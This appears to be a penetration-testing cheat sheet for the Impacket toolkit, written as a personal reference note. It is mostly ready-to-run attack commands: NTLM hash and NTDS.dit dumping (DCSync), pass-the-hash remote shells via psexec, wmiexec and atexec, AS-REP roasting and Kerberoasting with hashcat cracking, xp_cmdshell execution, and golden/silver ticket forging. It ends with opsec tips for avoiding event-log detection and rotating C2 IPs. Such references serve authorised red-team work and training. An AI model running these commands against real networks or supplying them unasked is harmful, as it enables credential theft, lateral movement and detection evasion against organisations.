---
title: Impacket
tags: '["tool", "impacket", "AD", "SMB", "lateral-movement",
  "post-exploitation", "python", "intermediate"]'
category: exploitation
platform: cross-platform (Python)
install: pip install impacket / git clone https://github.com/fortra/impacket
created: 2026-03-26
updated: 2026-03-26
difficulty: intermediate
---

# 🐍 Impacket

## What It Is
Impacket is a collection of Python classes for working with network protocols. Widely used in penetration testing for Active Directory attacks, SMB exploitation, credential dumping, and lateral movement. Developed by SecureAuth (now maintained by Fortra).

## Installation
```bash
# Via pip
pip3 install impacket

# From source (latest)
git clone https://github.com/fortra/impacket
cd impacket
pip3 install .

# Kali Linux (pre-installed in /usr/share/doc/python3-impacket/examples/)
ls /usr/share/doc/python3-impacket/examples/
```

---

## Core Scripts

### secretsdump.py — Remote Credential Dumping
Dumps NTLM hashes from SAM, NTDS.dit, LSA secrets remotely.

```bash
# Dump hashes via SMB (requires admin access)
secretsdump.py DOMAIN/user:password@TARGET_IP

# Pass-the-Hash
secretsdump.py -hashes :NTLM_HASH DOMAIN/user@TARGET_IP

# Dump domain controller NTDS.dit (DCSync attack)
secretsdump.py -just-dc DOMAIN/DomainAdmin:password@DC_IP

# Just NTLM hashes from DC (no Kerberos tickets)
secretsdump.py -just-dc-ntlm DOMAIN/DomainAdmin:password@DC_IP

# Local SAM dump (from registry hives)
secretsdump.py -sam SAM -system SYSTEM -security SECURITY LOCAL
```

### psexec.py — Remote Execution via SMB (Interactive Shell)
```bash
# With password
psexec.py DOMAIN/user:password@TARGET_IP

# Pass-the-Hash
psexec.py -hashes :NTLM_HASH DOMAIN/user@TARGET_IP

# Specific command
psexec.py DOMAIN/user:password@TARGET_IP cmd.exe
```

### wmiexec.py — Remote Execution via WMI (Semi-Interactive)
Less noisy than psexec (no service creation).
```bash
wmiexec.py DOMAIN/user:password@TARGET_IP
wmiexec.py -hashes :NTLM_HASH DOMAIN/user@TARGET_IP
wmiexec.py DOMAIN/user:password@TARGET_IP "whoami /all"
```

### smbclient.py — SMB File Browsing
```bash
smbclient.py DOMAIN/user:password@TARGET_IP
# Interactive: shares, use, get, put, ls

# List shares
smbclient.py DOMAIN/user:password@TARGET_IP -L

# Pass-the-Hash
smbclient.py -hashes :NTLM_HASH DOMAIN/user@TARGET_IP
```

### smbserver.py — SMB Share Server (File Transfer)
```bash
# Host a file share for transfers / capturing hashes
smbserver.py ShareName /path/to/share

# With authentication (force NTLMv2 capture)
smbserver.py -smb2support ShareName /path/to/share

# On target machine to pull files
# \\ATTACKER_IP\ShareName\file.exe
```

### GetNPUsers.py — AS-REP Roasting
Retrieves Kerberos AS-REP hashes for users with "Do not require Kerberos preauthentication" set.
```bash
# Find AS-REP roastable users (no password needed if anonymous)
GetNPUsers.py DOMAIN/ -usersfile users.txt -no-pass -dc-ip DC_IP -format hashcat

# With credentials
GetNPUsers.py DOMAIN/user:password -request -dc-ip DC_IP -format hashcat

# Crack the captured hash
hashcat -m 18200 asrep_hashes.txt /usr/share/wordlists/rockyou.txt
```

### GetUserSPNs.py — Kerberoasting
Requests Kerberos service tickets for accounts with SPNs set; cracks offline.
```bash
# Get Kerberoastable accounts and their TGS hashes
GetUserSPNs.py DOMAIN/user:password -dc-ip DC_IP -request -outputfile kerberoast.txt

# Crack with hashcat
hashcat -m 13100 kerberoast.txt /usr/share/wordlists/rockyou.txt
```

### atexec.py — Remote Execution via Task Scheduler
```bash
atexec.py DOMAIN/user:password@TARGET_IP "whoami"
atexec.py -hashes :NTLM_HASH DOMAIN/user@TARGET_IP "cmd /c dir C:\"
```

### mssqlclient.py — MSSQL Client
```bash
# Connect to MSSQL
mssqlclient.py DOMAIN/user:password@TARGET_IP -windows-auth

# Commands once connected:
# SQL> enable_xp_cmdshell
# SQL> xp_cmdshell "whoami"
```

### ticketer.py — Golden/Silver Ticket Generation
```bash
# Golden ticket (requires krbtgt hash from DCSync)
ticketer.py -nthash KRBTGT_HASH -domain-sid S-1-5-21-... -domain DOMAIN Administrator

# Silver ticket (requires service account hash)
ticketer.py -nthash SERVICE_HASH -domain-sid S-1-5-21-... -domain DOMAIN -spn cifs/TARGET Administrator

# Use the ticket
export KRB5CCNAME=Administrator.ccache
psexec.py -k -no-pass DOMAIN/Administrator@TARGET
```

---

## Authentication Methods

| Method | Syntax | Notes |
|---|---|---|
| Plaintext | `user:password@TARGET` | Standard |
| Pass-the-Hash | `-hashes :NTLM_HASH` (LM left blank) | NTLM hash reuse |
| Pass-the-Ticket | `-k -no-pass` + `KRB5CCNAME` env var | Kerberos TGT/TGS |
| Kerberos + keytab | `-k -no-pass` with keytab | Service accounts |

---

## Opsec Notes
> ⚠️ All Impacket scripts generate Windows event log entries. DCSync (secretsdump with `-just-dc`) triggers Event ID 4662. psexec creates a temporary service (Event 7045).
- wmiexec.py is stealthier than psexec (no service creation)
- Use `-no-output` in wmiexec for less noise
- Rotate C2 IPs; avoid scanning from the same host

---

## Related Notes
- CrackMapExec
- BloodHound
- Active-Directory
- AD-Attack-Reference
- Evil-WinRM
- Metasploit

## References
- Impacket GitHub: https://github.com/fortra/impacket
- Fortra (SecureAuth) Impacket docs

---
<- [[Tools-MOC]]